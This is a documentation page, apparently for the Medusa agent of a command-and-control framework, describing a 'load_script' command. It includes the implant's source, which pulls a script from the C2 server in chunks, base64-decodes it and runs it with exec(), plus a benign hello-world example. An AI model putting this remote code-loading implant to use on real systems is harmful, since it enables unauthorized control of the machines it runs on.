+++
title = "load_script"
chapter = false
weight = 100
hidden = false
+++

## Summary

This loads a new script into memory via the C2 channel. It can be used in combination with the `eval_code` function, and `setattr()` to dynamically add capability outside of Medusa's existing functions.  

- Python Versions Supported: 2.7, 3.8
- Needs Admin: False  
- Version: 1  
- Author: @ajpc500  

### Arguments

#### file

- Description: script file to load into agent
- Required Value: True  
- Default Value: None  

## Usage

```
load_script
```

## Detailed Summary

The python script is downloaded and executed using the Python `exec()` function. Notably, this implementation implements chunking for this function to facilitate large scripts being loaded.

Depending on the script content being interpreted, you can include functions that may be called later, using the `setattr()` function and Medusa's `eval_code` function.

Firstly, the function itself:

```Python
    def load_script(self, task_id, file):
        total_chunks = 1
        chunk_num = 0
        cmd_code = ""
        while (chunk_num < total_chunks):
            if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                return "Job stopped."
            data = { "action": "post_response", "responses": [
                    { "upload": { "chunk_size": CHUNK_SIZE, "file_id": file, "chunk_num": chunk_num }, "task_id": task_id }
                ]}
            response = self.postMessageAndRetrieveResponse(data)
            chunk = response["responses"][0]
            chunk_num+=1
            total_chunks = chunk["total_chunks"]
            cmd_code += base64.b64decode(chunk["chunk_data"]).decode()
            
        if cmd_code: exec(cmd_code)
        else: return "Failed to load script"

```

If we pass a script like the one below to Medusa, it'll print `hello` immediately. Then, as we've registered our `hello_again` function, we can call it again with the Medusa command: `eval_code self.hello_again()`. This will then execute the second print statement, to display `hello again`. A very simple example, but hopefully one that articulates what's possible here.

```
print("hello")

def hello_again(self):
    print("hello again")

setattr(medusa, "hello_again", hello_again)
```

{{% notice warning %}}
 Script content must be compatible with the version of Python the agent is running with!
{{% /notice %}}
 